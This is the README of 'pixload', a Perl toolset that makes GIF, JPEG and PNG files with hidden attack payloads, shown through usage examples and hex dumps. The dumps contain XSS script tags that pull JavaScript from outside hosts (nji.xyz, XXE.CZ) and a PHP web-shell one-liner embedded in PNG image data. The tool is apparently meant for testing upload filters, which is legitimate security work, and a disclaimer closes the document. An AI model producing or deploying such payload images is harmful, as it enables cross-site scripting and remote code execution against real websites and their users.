# pixload -- Image Payload Creating tools

## DESCRIPTION

Set of tools for creating/injecting payload into images.

## DEPENDS

The following Perl modules are required:

	- GD

	- ImageExif::Tool

	- String::HexConvert

	- URI

On Debian-based systems install these packages:

```sh
sudo apt install libgd-perl libimage-exiftool-perl libtext-string-hexconvert-perl liburi-perl
```

## TOOLS

### gif-all.pl

Create payload as a legitim `GIF` image.

##### Usage

```sh
./gif-all.pl [-payload 'String'] -output payload.gif
```
##### Example

```sh
$ ./gif-all.pl -output payload.gif
[>|      GIF89a Image ~ Payload Creator     |<]

    https://github.com/chinarulezzz/pixload


[>] Prepare GIF file
[✔] GIF with payload successfully created
[✔] File saved to: payload.gif

payload.gif: GIF image data, version 89a, 10799 x

00000000  47 49 46 38 39 61 2f 2a  00 ff 00 2c 00 00 00 00  |GIF89a/*...,....|
00000010  2f 2a 0a 00 00 02 00 3b  2a 2f 3d 31 3b 3c 73 63  |/*.....;*/=1;<sc|
00000020  72 69 70 74 20 73 72 63  3d 2f 2f 6e 6a 69 2e 78  |ript src=//nji.x|
00000030  79 7a 3e 3c 2f 73 63 72  69 70 74 3e 3b           |yz></script>;|
0000003d
```

### jpg-all.pl

Create payload as a legitim `JPEG` image.
Also, permits to inject the payload into an existing image.

##### Usage

```sh
./jpg-all.pl [-payload 'STRING'] -output payload.jpg

If the output file exists, then the payload will be injected into the
existing file.  Else the new one will be created.
```

##### Example

```sh
./jpg-all.pl -output payload.jpg
[>|        JPEG Tags ~ Payload Creator      |<]

    https://github.com/chinarulezzz/pixload


[>] Generating output file
[✔] File saved to: payload.jpg

[>] Injecting payload into comment tag
[✔] Payload was injected successfully

payload.jpg: JPEG image data, JFIF standard 1.01, resolution (DPI), density 96x96, segment length 16, comment: "<script src//nji.xyz></script>", baseline, precision 8, 32x32, components 3

00000000  ff d8 ff e0 00 10 4a 46  49 46 00 01 01 01 00 60  |......JFIF.....`|
00000010  00 60 00 00 ff fe 00 20  3c 73 63 72 69 70 74 20  |.`..... <script |
00000020  73 72 63 2f 2f 6e 6a 69  2e 78 79 7a 3e 3c 2f 73  |src//nji.xyz></s|
00000030  63 72 69 70 74 3e ff db  00 43 00 08 06 06 07 06  |cript>...C......|
00000040  05 08 07 07 07 09 09 08  0a 0c 14 0d 0c 0b 0b 0c  |................|
00000050  19 12 13 0f 14 1d 1a 1f  1e 1d 1a 1c 1c 20 24 2e  |............. $.|
00000060  27 20 22 2c 23 1c 1c 28  37 29 2c 30 31 34 34 34  |' ",#..(7),01444|
00000070  1f 27 39 3d 38 32 3c 2e  33 34 32 ff db 00 43 01  |.'9=82<.342...C.|
00000080  09 09 09 0c 0b 0c 18 0d  0d 18 32 21 1c 21 32 32  |..........2!.!22|
00000090  32 32 32 32 32 32 32 32  32 32 32 32 32 32 32 32  |2222222222222222|
*
...
000002a0  28 a0 0f ff d9                                    |(....|
000002a5
```

### png-js.pl

Create `XSS` payload `<script src=//your_host></script>` as a legitim `PNG` image.

##### Usage

```sh
./png-js.pl -domain xxe.cz -output payload.png

Note: Only 3 characters domains supported.
```

##### Example

```sh
[>| PNG IDAT chunks ~ JS Payload Generator |<]
    
    https://github.com/chinarulezzz/pixload


[>] Starting GZDeflate bruteforce

    Domain: XXE.CZ
    Payload: <SCRIPT SRC=//XXE.CZ></script>

    It will take some time ~ please wait :)

[>] Bruteforcing tld
[✔] TLD successfully bruteforced

[>] Bruteforcing domain
[✔] 3rd 'E' character bruteforced
[✔] 2nd 'X' character bruteforced
[✔] 1st 'X' character bruteforced

[>] Trying to apply PNG filters
[✔] PNG filters done

[>] Generating output file
[✔] PNG with payload successfully generated
    Hex payload: 3c534352495054205352433d2f2f5858452e435a3e3c2f7363726970743e
[✔] File saved to: payload.png

payload.png: PNG image data, 32 x 32, 8-bit/color RGB, non-interlaced

00000000  89 50 4e 47 0d 0a 1a 0a  00 00 00 0d 49 48 44 52  |.PNG........IHDR|
00000010  00 00 00 20 00 00 00 20  08 02 00 00 00 fc 18 ed  |... ... ........|
00000020  a3 00 00 00 09 70 48 59  73 00 00 0e c4 00 00 0e  |.....pHYs.......|
00000030  c4 01 95 2b 0e 1b 00 00  00 65 49 44 41 54 48 89  |...+.....eIDATH.|
00000040  63 64 60 f8 3c 53 43 52  49 50 54 20 53 52 43 3d  |cd`.<SCRIPT SRC=|
00000050  2f 2f 58 58 45 2e 43 5a  3e 3c 2f 73 63 72 69 70  |//XXE.CZ></scrip|
00000060  74 3e 03 43 54 93 fa 4c  8d f9 57 ff 9e b9 19 f6  |t>.CT..L..W.....|
00000070  8a e5 a5 97 87 e2 a9 5b  b7 ad 9e bc e7 71 75 4c  |.......[.....quL|
00000080  90 d0 0d 62 11 58 e3 67  cc 30 0a 46 c1 28 18 05  |...b.X.g.0.F.(..|
00000090  a3 60 14 8c 82 51 30 0a  46 c1 28 18 06 00 00 84  |.`...Q0.F.(.....|
000000a0  a6 19 02 20 9f 31 8e 00  00 00 00 49 45 4e 44 ae  |... .1.....IEND.|
000000b0  42 60 82                                          |B`.|
000000b3
```

### png-php.pl

Create `PHP` payload as a legitim `PNG` image.

##### Usage

```sh
./png-php.pl -output payload.png
```

##### Example

```sh
[>| PNG IDAT chunks  ~  PHP Payload Creator |<]

    https://github.com/chinarulezzz/pixload


[>] Generating output file
[✔] PNG with payload successfully generated
[✔] File saved to: payload.png

payload.png: PNG image data, 32 x 32, 8-bit/color RGB, non-interlaced

00000000  89 50 4e 47 0d 0a 1a 0a  00 00 00 0d 49 48 44 52  |.PNG........IHDR|
00000010  00 00 00 20 00 00 00 20  08 02 00 00 00 fc 18 ed  |... ... ........|
00000020  a3 00 00 00 09 70 48 59  73 00 00 0e c4 00 00 0e  |.....pHYs.......|
00000030  c4 01 95 2b 0e 1b 00 00  00 5c 49 44 41 54 48 89  |...+.....\IDATH.|
00000040  63 5c 3c 3f 3d 24 5f 47  45 54 5b 30 5d 28 24 5f  |c\<?=$_GET[0]($_|
00000050  50 4f 53 54 5b 31 5d 29  3b 3f 3e 58 80 81 81 c1  |POST[1]);?>X....|
00000060  73 5e 37 93 fc 8f 8b db  7e 5f d3 7d aa 27 f7 f1  |s^7.....~_.}.'..|
00000070  e3 c9 bf 5f ef 06 7c b2  30 30 63 d9 59 11 3f 8b  |..._..|.00c.Y.?.|
00000080  61 14 8c 82 51 30 0a 46  c1 28 18 05 a3 60 14 8c  |a...Q0.F.(...`..|
00000090  82 51 30 9c 00 00 d7 41  18 02 db 3e 41 55 00 00  |.Q0....A...>AU..|
000000a0  00 00 49 45 4e 44 ae 42  60 82                    |..IEND.B`.|
000000aa
```

## LICENSE

WTFPL

## LEGAL DISCLAIMER

The author does not hold any responsibility for the bad use
of this tool, remember that attacking targets without prior
consent is illegal and punished by law.

